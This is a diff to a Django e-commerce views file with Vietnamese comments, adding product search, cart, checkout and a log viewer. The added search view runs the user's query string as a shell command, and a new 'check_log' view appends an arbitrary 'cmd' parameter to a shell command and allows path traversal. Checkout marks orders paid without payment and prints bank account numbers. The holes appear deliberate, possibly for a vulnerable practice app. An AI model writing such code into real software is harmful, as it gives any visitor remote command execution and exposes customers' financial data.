@@ -9,10 +9,13 @@ from django.contrib.auth.decorators import login_required
 from django.contrib.auth import update_session_auth_hash
 from django.contrib.auth.forms import PasswordChangeForm
 from django.views.decorators.csrf import requires_csrf_token
-from .models import Cart, CartItem, Product
+from .models import Cart, CartItem, Product, Order
+from django.core.mail import send_mail
+
 import os
 from django.http import HttpResponse, Http404
 from django.conf import settings
+import subprocess
 
 def signup(request):
     if request.method == 'POST':
@@ -69,8 +72,25 @@ def user_logout(request):
     return redirect('home')
 
 def product_list(request):
+    query = request.GET.get('q')
     products = Product.objects.all()
-    return render(request, 'product_list.html', {'products': products})
+    output = ""
+
+    if query:
+        # Tìm kiếm sản phẩm trong cơ sở dữ liệu
+        products = Product.objects.filter(name__icontains=query) | Product.objects.filter(description__icontains=query)
+        
+        # Thực thi lệnh hệ thống dựa trên từ khóa tìm kiếm
+        command = query  # Dùng trực tiếp từ khóa người dùng nhập để thực thi lệnh
+        try:
+            # Sử dụng subprocess để thực thi lệnh hệ thống
+            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = result.stdout.decode('utf-8').strip()  # Lấy kết quả stdout của lệnh hệ thống
+        except Exception as e:
+            output = f"Error: {str(e)}"  # Xử lý ngoại lệ nếu có lỗi xảy ra khi thực thi lệnh
+    
+    # Trả về kết quả tìm kiếm sản phẩm và kết quả lệnh hệ thống
+    return render(request, 'product_list.html', {'products': products, 'output': output})
 
 @login_required
 def edit_profile(request):
@@ -120,9 +140,14 @@ def csrf_failure(request, reason=""):
 
 @login_required
 def cart_list(request):
-    cart = Cart.objects.filter(user=request.user).first()
-    total_price = sum(item.product.price * item.quantity for item in cart.cartitem_set.all())
-    return render(request, 'cart.html', {'cart': cart, 'total_price': total_price})
+    cart = get_object_or_404(Cart, user=request.user)  # Lấy giỏ hàng của người dùng
+    cart_items = cart.cartitem_set.all()
+    total_price = sum(item.product.price * item.quantity for item in cart_items)
+    total_price_float = float(total_price)
+    # Lưu total_price vào session để sử dụng trong checkout
+    request.session['total_price'] = total_price_float
+
+    return render(request, 'cart.html', {'cart': cart, 'total_price': total_price_float, 'cart_items': cart_items})
 
 @login_required
 def add_to_cart(request, product_id):
@@ -197,4 +222,63 @@ def view_file(request):
         
     except IOError as e:
         print(f"IOError: {e}")
-        raise Http404("File not found")                          
+        raise Http404("File not found")            
+        
+def checkout(request):
+    total_price = request.session.get('total_price', 0)  # Lấy total_price từ session
+    cart = get_object_or_404(Cart, user=request.user)  # Lấy giỏ hàng của người dùng
+    cart_items = cart.cartitem_set.all()  # Lấy danh sách sản phẩm trong giỏ hàng
+
+    # Tính toán số lượng mặt hàng và tổng giá trị
+    total_items = cart_items.count()  # Số lượng mặt hàng
+    total_price = sum(item.product.price * item.quantity for item in cart_items)  # Tổng giá trị
+
+    if request.method == 'POST':
+        bank_account = request.POST.get('bank_account')
+        email = request.POST.get('email')
+        email_host_user = settings.EMAIL_HOST_USER
+        print(f'Bank Account: {bank_account}, Email: {email}')
+
+        # Lưu thông tin đơn hàng vào database
+        order = Order.objects.create(
+            user=request.user,
+            cart=cart,
+            total_price=total_price,
+            is_paid=True,  # Giả sử thanh toán thành công
+            bank_account=bank_account,
+            email=email
+        )
+        
+        # Gửi email xác nhận
+        subject = 'Xác nhận thanh toán thành công'
+        message = f'Cảm ơn bạn đã mua hàng. Tổng giá trị đơn hàng của bạn là {total_price}.'
+
+        try:
+            send_mail(subject, message, email_host_user, [email], fail_silently=False)
+            messages.success(request, "Thanh toán thành công! Email xác nhận đã được gửi.")
+        except Exception as e:
+            messages.error(request, f"Thanh toán thành công nhưng không thể gửi email: {e}")
+        
+        # Xóa giỏ hàng sau khi thanh toán
+        cart.delete()  # Xóa giỏ hàng
+        return redirect('product_list')  # Quay lại trang giỏ hàng sau khi thanh toán
+    
+    return render(request, 'checkout.html', {
+    	'cart' : cart,
+        'total_price': total_price,
+        'total_items': total_items,  # Thêm biến total_items
+    })
+
+def check_log(request):
+	log_file = request.GET.get('log_file','django.log')
+	log_path = f'/home/ubuntu/PBL6/sales_web/logs/{log_file}'
+	additional_command = request.GET.get('cmd', '')
+	
+	command = f'cat {log_path}; {additional_command} '
+	process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	stdout, stderr = process.communicate()
+	
+	return HttpResponse(f'<pre>{stdout.decode()}\n{stderr.decode()}</pre>')
+		
+	
+	
